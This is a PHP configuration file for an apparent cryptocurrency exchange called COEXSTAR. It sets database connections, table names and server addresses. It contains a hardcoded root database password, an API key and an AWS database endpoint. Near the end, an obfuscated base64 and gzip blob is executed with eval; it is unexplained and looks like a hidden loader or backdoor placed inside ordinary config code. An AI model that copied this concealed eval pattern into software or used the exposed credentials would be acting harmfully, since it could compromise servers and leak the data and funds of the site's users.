<?php


error_reporting(E_ALL);
ini_set("display_errors", 0);

$COKEY="7d8530079cbc15cf01351c95c4c6ff32e731f5261fcb6096ae917150c6e15309";
$WEB_SERVER_URL = "http://54.169.23.13:5000";
$WEBSITE = "COEXSTAR";
$WEB_API_URL = "127.0.0.1:5050";
$WALLET_API_URL = "127.0.0.1:8800";
$REDIS_HOST = "127.0.0.1";
$dburl="127.0.0.1";
$dburlro="coexstar-cluster-1.cluster-ro-c9ojidhatggr.ap-southeast-1.rds.amazonaws.com";
$dbname="coexstar";
$dbid="root";
$dbpass="coex#1234";


$IMG_URL = "http://54.169.23.13:5000/uploads/";



$dbconn =mysqli_connect($dburl, $dbid, $dbpass);
mysqli_set_charset($dbconn,"utf8");
$status = mysqli_select_db($dbconn,$dbname);



//$dd = $_SERVER["REMOTE_ADDR"];
//if($dd != "112.160.85.23"){
//	exit;
//}

//// mysql_li

//// PDO
$db_charset  = 'utf8';
$dsn = "mysql:host=$dburl;dbname=$dbname;charset=$db_charset";
try {
$pdo = new PDO($dsn, $dbid, $dbpass, NULL);
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, TRUE);
} catch (PDOException $e) {
    echo 'Connection failed: ' . $e->getMessage();
}

//// PDO
$time = mktime(12,00,00,07,13,2018);
$p_ptop                 = "p_ptop";
$p_order                = "p_order";
$m_bankmoney			="m_bankmoney";	
$m_login				   ="m_login";		
$m_admlogin				="m_admlogin";	
$table_bank				="c_bank";		
$table_level			="c_level";		
$table_setup			="c_setup";		
$m_setup_tb			   ="m_setup";		
$c_daily_limit_tb	   ="c_daily_limit";		
$admin_member			="m_admin";		
$table_orderbuy		="b_coinorderbuy";
$table_ordersell		="b_coinordersell";
$table_k_deposit		="k_deposit";
$table_fav           ="favorites";
$admlogs             ="m_admlogs";
$table_point	      ="coin_point";
$watchlist           ="m_watchlist";
$table_krwpoint		="krw_point";
$table_withdraw		="t_withdraw";	
$table_authorization ="m_authorization";
$member_p			   ="member_p";	
$member 			      ="m_member";
$admin_ip_table      ="admin_ip";
$table_fee           ="c_fees";
$stake               ="m_stake";
$nomal_key 			   = base64_encode(time());
$org_key 			   = base64_encode(time());
$check_key_format 	= base64_encode(time());
$fee_list = "fee_list";

eval(gzinflate(base64_decode('Dc/JcoIwAADQz1GHQ2WH6SkIqOwBZLt0BBKkBIKyjX59+/7gofVO9s2nHTC5z2hf3ickCT81qmiN9jtSic6NuhsAOhTEaIkAfbuGkGErAVuLtBxhCMArUvpu8uyaF1WRb+aKkchFJAE3n7k1tEcs8Y+XFKrB+5n2CZRMfFOWCs7P5BkP45nlyiNxQnX8LNAI5dAuSI4fNukqv9JNakyBV+DeGt1uCoBynEZh1i0vf8EGc4E0weW39rvwFvB5AVSrjpfUXNWBY7JNuFBmlTNFfgSFDEl7Omut9eXk0NHYwQTDFavyK/dLs/f8NQKxCMyCCtA0asMVWCPwM85mCNV6Sh0Yi30qX/9D2fYxnJK1Ec0ncr3oXFKdEiVjva3O07AhMXsEo66STNF2h8Ph+w8=')));

function sql_escape($arrays) {
   global $dbconn;

   foreach($arrays as $key=>$value){
	   //$arrays[$key] = sqlfilter($value);
      $arrays[$key] = mysqli_real_escape_string($dbconn, $value);
   }
   return $arrays;
}

?>
